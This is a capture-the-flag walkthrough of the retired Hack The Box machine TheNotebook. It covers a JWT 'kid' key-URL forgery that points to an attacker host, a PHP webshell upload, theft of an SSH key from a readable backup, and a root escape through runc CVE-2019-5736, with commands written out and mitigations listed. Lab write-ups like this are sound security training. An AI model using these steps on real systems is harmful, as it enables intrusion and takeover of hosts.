---
machine: TheNotebook
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, jwt, docker, runc, privesc]
---

# TheNotebook — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The JWT uses `kid`, which points to an attacker-controlled URL; serve a key and sign an admin token. The panel allows PHP uploads and yields `www-data`. `/var/backups/home.tar.gz` contains `noah`'s SSH key, and he can run `docker exec` as root. Docker 18.06 uses a runc vulnerable to CVE-2019-5736; from the container, overwrite runc and write a key to `/root/.ssh/authorized_keys`.

## Recon

```bash
nmap -Pn -sCV -p22,80,10010 <IP>
```

- `22` SSH, `80` nginx and `10010` a Docker service.
- The site allows user registration and note creation.
- JWTs use `kid` to locate the verification key.

## Enumeration

- `kid` is resolved as a path or URL; it can point to `http://<ATTACKER>/key`.
- The application accepts `RS256` and fetches the public key named by `kid`.
- The admin panel allows file uploads.

## Foothold

Generate an RSA pair, serve the public key and sign a JWT with `kid` pointing to the attacker and `username=admin`. With the token, upload a PHP webshell and get `www-data`.

```bash
python3 jwt_forge.py --kid http://<ATTACKER>/key --user admin
curl -b 'auth=<TOKEN>' -F 'file=@shell.php' http://<IP>/admin/upload.php
```

## Lateral movement

`/var/backups/home.tar.gz` is readable and contains `noah`'s private SSH key. After logging in, `noah` can run `docker exec -it webapp-dev01*` as root.

```bash
tar -xzf /var/backups/home.tar.gz -C /tmp
ssh -i /tmp/home/noah/.ssh/id_rsa noah@<IP>
```

## Privilege escalation

Docker 18.06.0 uses runc older than 18.09.2, vulnerable to CVE-2019-5736. From the container, overwrite `/bin/sh` with `#!/proc/self/exe` and write the payload into the host runc binary; the next `docker exec` runs it as root.

```bash
docker exec -it webapp-dev01 bash
# inside the container: compile and run the CVE-2019-5736 exploit
```

## Evidence

- `kid` pointing to the attacker key and an admin token.
- PHP webshell and `www-data` shell.
- `home.tar.gz` with `noah`'s key.
- Docker 18.06 and runc overwritten through CVE-2019-5736.

## Lessons learned

- A controllable `kid` turns JWT verification into an open door.
- Readable backups often contain private keys.
- An old Docker can compromise the host through runc.

## Mitigation and detection

- Validate `kid` against an allowlist and never load keys from URLs.
- Protect backups and rotate keys after a leak.
- Update Docker/runc and restrict `docker exec` through sudo.

## References

- [0xdf — TheNotebook](https://0xdf.gitlab.io/2021/07/31/htb-thenotebook.html)
- [IppSec — TheNotebook](https://www.youtube.com/watch?v=S4FrlMTY0GY)
- [Hack The Box — TheNotebook](https://app.hackthebox.com/machines/thenotebook)
